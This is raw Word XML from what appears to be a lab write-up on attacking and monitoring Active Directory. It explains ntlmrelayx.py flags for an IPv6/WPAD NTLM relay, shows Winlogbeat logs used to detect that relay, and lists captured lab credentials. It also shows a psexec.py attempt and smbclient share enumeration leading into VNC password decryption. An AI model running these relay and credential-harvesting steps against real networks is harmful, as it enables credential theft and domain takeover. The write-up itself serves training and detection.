      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlmrelayx.py - python script for windows pen testing this tool relay the hashes that we capture from our attack and then relay those hashes to active directory</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-6 means listening on ipv6 requests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-t - ldaps://10.10.1.100 the target for this attack will </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ldap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> security of the active directory 10.10.1.100 the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> of windows server.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fakewpad.laderlapen</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> here we can put every name we want it’s the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wpad</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> host name.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> – this will be the directory after the attack succeed we will dump all the information about this domain.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Also important point for this attack for making this work we restart our windows user machine and login again and by this </w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>login we actually grab the hash and relay that to the active directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="003D55EA" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251664384" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="margin">
              <wp:posOffset>-284480</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1680845</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6559550" cy="3333115"/>
            <wp:effectExtent l="0" t="0" r="0" b="635"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21481"/>
                <wp:lineTo x="21516" y="21481"/>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59550" cy="3333115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
            </wp14:sizeRelH>
            <wp14:sizeRelV relativeFrom="page">
              <wp14:pctHeight>0</wp14:pctHeight>
            </wp14:sizeRelV>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Also I marked in red as we can see there is the user: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fcastle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> succeed which means this is the time when the attacker spoof ipv6 requests from the domain user, then got the hash from the user because our ipv6 server answer to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>dns</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> request of the user. Now let’s check how we can monitor this </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="008D1FF0" w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> relay attack and see how we can catch this type of attack.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002602ED" w:rsidRPr="002602ED" w:rsidRDefault="002602ED" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRPr="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Here we see log that comes from </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>winlogbeat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which show us when we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack and we relay the hash that we captured to the active directory. Here above we can understand that this is malicious activity because we can see I marked in red that this </w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">login happened from 10.10.0.9 and this impossible because this is the Ubuntu </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> our windows host s</w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on another </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.8 and also this event type number 3 which stands for network activities. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="008D1FF0" w:rsidRDefault="008D1FF0" w:rsidP="008D1FF0">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">we defiantly can catch </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1FF0">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> relay attacks with this type of logs.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="00944C35" w:rsidRDefault="007E710C" w:rsidP="00944C35">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>PSEXEC.py</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00247098" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidR="004A1B95" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>With The First User</w:t>
      </w:r>
      <w:r w:rsidR="00247098" w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRDefault="007E710C" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="534"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2C1BFF33" wp14:editId="491A1980">
            <wp:extent cx="5486400" cy="17570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757045"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="007E710C" w:rsidRDefault="007E710C" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above now we got credentials </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="007E710C" w:rsidRDefault="007E710C" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>User :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ppakrer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRPr="007E710C" w:rsidRDefault="007E710C" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Password :</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> Amigos123</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007E710C" w:rsidRDefault="007E710C" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now because we have username and password we first try get shell with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ppakrer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> user for this step we use psexec.py we try that and </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> failed why? If </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>psexec</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007E710C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> failed, it’s because this user doesn’t have administrator privileges. So now we need find another way how we can get shell on the user or try get access to the second user let’s see how we can do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D55EA" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="00944C35" w:rsidRDefault="003A1653" w:rsidP="00944C35">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>SMBClient</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> + VNC Password Decrypt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="37522210" wp14:editId="64F18D23">
            <wp:extent cx="5486400" cy="1802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802765"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>smbclient</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –L 10.10.1.100 –U </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>pparker</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRPr="003A1653" w:rsidRDefault="003A1653" w:rsidP="003A1653">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">First we use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>smbclient</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to view all shared folders and as we can see we have here few shared folders the most interesting here </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="003A1653">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> ‘Share’ let’s access to this directory and see what we got there.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003A1653" w:rsidRDefault="003A1653" w:rsidP="007E710C">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="522"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55C262BB" wp14:editId="1D528577">
            <wp:extent cx="5486400" cy="4273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273055"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
